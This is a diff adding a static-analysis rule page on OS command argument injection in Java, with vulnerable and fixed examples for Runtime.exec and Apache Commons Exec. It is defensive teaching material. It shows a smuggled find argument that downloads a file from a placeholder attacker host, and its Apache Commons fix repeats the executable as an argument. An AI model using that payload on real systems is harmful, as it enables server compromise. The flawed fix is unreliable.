@@ -1,0 +1,315 @@
+<div class="sect1">
+<h2 id="_description">Description</h2>
+<div class="sectionbody">
+
+</div>
+</div>
+<div class="sect1">
+<h2 id="_why_is_this_an_issue">Why is this an issue?</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>OS command argument injections occur when applications allow the execution of
+operating system commands from untrusted data but the untrusted data is limited
+to the arguments.<br>
+It is not possible to directly inject arbitrary commands that
+compromise the underlying operating system, but the behavior of the executed
+command still might be influenced in a way that allows to expand access, for
+example, execution of arbitrary commands. The security of the application
+depends on the behavior of the application that is executed.</p>
+</div>
+<div class="sect2">
+<h3 id="_what_is_the_potential_impact">What is the potential impact?</h3>
+<div class="paragraph">
+<p>An attacker exploiting an arguments injection vulnerability will be able to add
+arbitrary argument to a system binary call. Depending on the command the
+parameters are added to, this might lead to arbitrary command execution.</p>
+</div>
+<div class="paragraph">
+<p>The impact depends on the access control measures taken on the target system
+OS. In the worst-case scenario, the process runs with root privileges, and
+therefore any OS commands or programs may be affected.</p>
+</div>
+<div class="paragraph">
+<p>Below are some real-world scenarios that illustrate some impacts of an attacker
+exploiting the vulnerability.</p>
+</div>
+<div class="sect3">
+<h4 id="_denial_of_service_and_data_leaks">Denial of service and data leaks</h4>
+<div class="paragraph">
+<p>In this scenario, the attack aims to disrupt the organization&#8217;s activities and
+profit from data leaks.</p>
+</div>
+<div class="paragraph">
+<p>An attacker could, for example:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>download the internal server&#8217;s data, most likely to sell it</p>
+</li>
+<li>
+<p>modify data, send malware</p>
+</li>
+<li>
+<p>stop services or exhaust resources (with fork bombs for example)</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>This threat is particularly insidious if the attacked organization does not
+maintain a disaster recovery plan (DRP).</p>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_root_privilege_escalation_and_pivot">Root privilege escalation and pivot</h4>
+<div class="paragraph">
+<p>In this scenario, the attacker can do everything described in the previous
+section. The difference is that the attacker also manages to elevate their
+privileges to an administrative level and attacks other servers.</p>
+</div>
+<div class="paragraph">
+<p>Here, the impact depends on how much the target company focuses on its Defense
+In Depth. For example, the entire infrastructure can be compromised by a
+combination of OS injections and <strong>misconfiguration</strong> of:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Docker or Kubernetes clusters</p>
+</li>
+<li>
+<p>cloud services</p>
+</li>
+<li>
+<p>network firewalls and routing</p>
+</li>
+<li>
+<p>OS access control</p>
+</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_how_to_fix_it_in_java_lang_package">How to fix it in Java Lang Package</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="_code_examples">Code examples</h3>
+<div class="paragraph">
+<p>The following code uses the <code>find</code> command and expects the user to enter the
+name of a file to find on the system.</p>
+</div>
+<div class="paragraph">
+<p>It is vulnerable to argument injection because untrusted data is
+inserted in the arguments of a process call without prior validation or
+sanitization.<br>
+Here, the application ignores that a user-submitted parameter might contain
+special characters that will tamper with the expected system command behavior.</p>
+</div>
+<div class="paragraph">
+<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code>
+command for malicious purposes. For example, the following payload will download
+malicious software on the application&#8217;s hosting server.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre> -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;</pre>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_noncompliant_code_example">Noncompliant code example</h4>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-java" data-lang="java">@Controller
+public class ExampleController
+{
+    @GetMapping(value = "/find")
+    public void find(@RequestParam("filename") String filename) throws IOException {
+
+        Runtime.getRuntime().exec("/usr/bin/find . -iname " + filename);
+    }
+}</code></pre>
+</div>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_compliant_solution">Compliant solution</h4>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-java" data-lang="java">@Controller
+public class ExampleController
+{
+    @GetMapping(value = "/find")
+    public void find(@RequestParam("filename") String filename) throws IOException {
+
+        String cmd1[] = new String[] {"/usr/bin/find", ".", "-iname", filename};
+        Process proc = Runtime.getRuntime().exec(cmd1); // Compliant
+    }
+}</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>java.lang.Runtime is sometimes used over java.lang.ProcessBuilder due to ease of use. Flexibility in methods often introduces security issues as edge cases are easily missed. The compliant solution logic is also applied to java.lang.ProcessBuilder.</p>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_how_does_this_work">How does this work?</h3>
+<div class="paragraph">
+<p>Allowing users to insert data in operating system commands generally creates
+more problems than it solves.</p>
+</div>
+<div class="paragraph">
+<p>Anything that can be done via operating system commands can usually be done via a
+language&#8217;s native SDK.<br>
+Therefore, our suggestion is to avoid using OS commands in the first place.</p>
+</div>
+<div class="paragraph">
+<p>Here <code>java.lang.Runtime.exec(String[] cmdarray)</code> takes care of escaping the passed arguments and internally
+creates a single string given to the operating system to be executed.</p>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_how_to_fix_it_in_apache_commons">How to fix it in Apache Commons</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="_code_examples_2">Code examples</h3>
+<div class="paragraph">
+<p>The following code uses the <code>find</code> command and expects the user to enter the
+name of a file to find on the system.</p>
+</div>
+<div class="paragraph">
+<p>It is vulnerable to argument injection because untrusted data is
+inserted in the arguments of a process call without prior validation or
+sanitization.<br>
+Here, the application ignores that a user-submitted parameter might contain
+special characters that will tamper with the expected system command behavior.</p>
+</div>
+<div class="paragraph">
+<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code>
+command for malicious purposes. For example, the following payload will download
+malicious software on the application&#8217;s hosting server.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre> -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;</pre>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_noncompliant_code_example_2">Noncompliant code example</h4>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-java" data-lang="java">@Controller
+public class ExampleController
+{
+    @GetMapping(value = "/find")
+    public void find(@RequestParam("filename") String filename) throws IOException {
+
+        CommandLine cmd = new CommandLine("/usr/bin/find . -iname " + filename);
+    }
+}</code></pre>
+</div>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_compliant_solution_2">Compliant solution</h4>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-java" data-lang="java">@Controller
+public class ExampleController
+{
+    @GetMapping(value = "/find")
+    public void find(@RequestParam("filename") String filename) throws IOException {
+
+        CommandLine cmd = new CommandLine("/usr/bin/find");
+        cmd.addArguments(new String[] {"/usr/bin/find", ".", "-iname", filename});
+    }
+}</code></pre>
+</div>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_how_does_this_work_2">How does this work?</h3>
+<div class="paragraph">
+<p>Allowing users to insert data in operating system commands generally creates
+more problems than it solves.</p>
+</div>
+<div class="paragraph">
+<p>Anything that can be done via operating system commands can usually be done via a
+language&#8217;s native SDK.<br>
+Therefore, our suggestion is to avoid using OS commands in the first place.</p>
+</div>
+<div class="paragraph">
+<p>Here <code>org.apache.commons.exec.CommandLine.addArguments(String[] addArguments)</code> takes care of escaping the passed arguments and internally
+creates a single string given to the operating system to be executed.</p>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_resources">Resources</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="_documentation">Documentation</h3>
+<div class="ulist">
+<ul>
+<li>
+<p>OWASP - <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">OS Command Injection Defense Cheat Sheet</a></p>
+</li>
+<li>
+<p>GTFOBins - <a href="https://gtfobins.github.io/#+shell">list of Unix binaries that can be used to bypass local security restrictions</a></p>
+</li>
+<li>
+<p>LOLBAS - <a href="https://lolbas-project.github.io/#">list of Windows binaries that can be used to bypass local security restrictions</a></p>
+</li>
+</ul>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_standards">Standards</h3>
+<div class="ulist">
+<ul>
+<li>
+<p>OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a></p>
+</li>
+<li>
+<p>OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a></p>
+</li>
+<li>
+<p>OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation">Mobile Top 10 2024 Category M4 - Insufficient Input/Output Validation</a></p>
+</li>
+<li>
+<p>CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a></p>
+</li>
+<li>
+<p>CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a></p>
+</li>
+<li>
+<p>STIG Viewer - <a href="https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609">Application Security and Development: V-222609</a> - The application must not be subject to input handling vulnerabilities.</p>
+</li>
+</ul>
+</div>
+<hr>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_implementation_specification">Implementation Specification</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>(visible only on this page)</p>
+</div>
+<div class="sect2">
+<h3 id="_message">Message</h3>
+<div class="paragraph">
+<p>Change this code to not construct OS command arguments from user-controlled data.</p>
+</div>
+<hr>
+</div>
+</div>
+</div>
